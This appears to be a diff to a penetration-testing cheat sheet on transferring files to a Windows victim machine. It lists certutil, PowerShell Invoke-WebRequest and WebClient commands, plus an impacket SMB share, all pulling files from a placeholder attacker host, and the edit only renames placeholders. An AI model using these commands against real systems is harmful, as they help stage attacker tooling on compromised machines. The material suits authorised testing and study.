@@ -2,19 +2,19 @@
 
 ## Certutil.exe
 ```
-certutil.exe -urlcache -split -f "http://ip:port/file" <output-file>
+certutil.exe -urlcache -split -f "http://IP:PORT/file" <output-file>
 ```
 
 ## Powershell
 ```
-powershell Invoke-WebRequest "http://ip:port/file" -OutFile "<output-file>"
+powershell Invoke-WebRequest "http://IP:PORT/file" -OutFile "<output-file>"
 ```
 
 ## Powershell wget file
 ```
 echo $storageDir = $pwd > wget.ps1
 echo $webclient = New-Object System.Net.WebClient >> wget.ps1
-echo $url = “http://ip:port/file” >> wget.ps1
+echo $url = “http://IP:PORT/file” >> wget.ps1
 echo $file = “<output-file>” >> wget.ps1
 echo $webclient.DownloadFile($url,$file) >> wget.ps1
 ```
@@ -28,5 +28,5 @@ python3 /usr/share/doc/python3-impacket/examples/smbserver.py <share-name> <shar
 ```
 on victim machine
 ```
-net use \\attacker_ip\share_name
-copy \\attacker_ip\share_name\file <output-file>
+net use \\ATTACKER-IP\SHARE-NAME
+copy \\ATTACKER-IP\SHARE-NAME\file <output-file>
